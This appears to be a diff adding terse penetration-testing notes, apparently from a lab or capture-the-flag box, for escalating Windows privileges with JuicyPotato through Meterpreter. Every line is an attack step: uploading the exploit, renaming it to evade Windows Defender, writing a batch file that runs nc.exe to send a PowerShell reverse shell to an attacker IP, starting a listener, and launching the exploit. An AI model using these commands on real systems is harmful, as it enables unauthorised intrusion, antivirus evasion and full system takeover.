@@ -1,0 +1,19 @@
+
+https://github.com/ohpe/juicy-potato/releases
+
+upload juicy-potato with meterpreter:
+msf > lcd /home/username/Downloads
+msf > upload JuicyPotato.exe
+
+Rename to prevent windows defender:
+msf > mv JuicyPotato.exe js.exe
+
+Create batch file:
+echo C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.2 1111 > shell.bat
+
+Start extra netcat listener on attacker box:
+nc -lvp 1111
+
+Start juicy-potato:
+js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
+
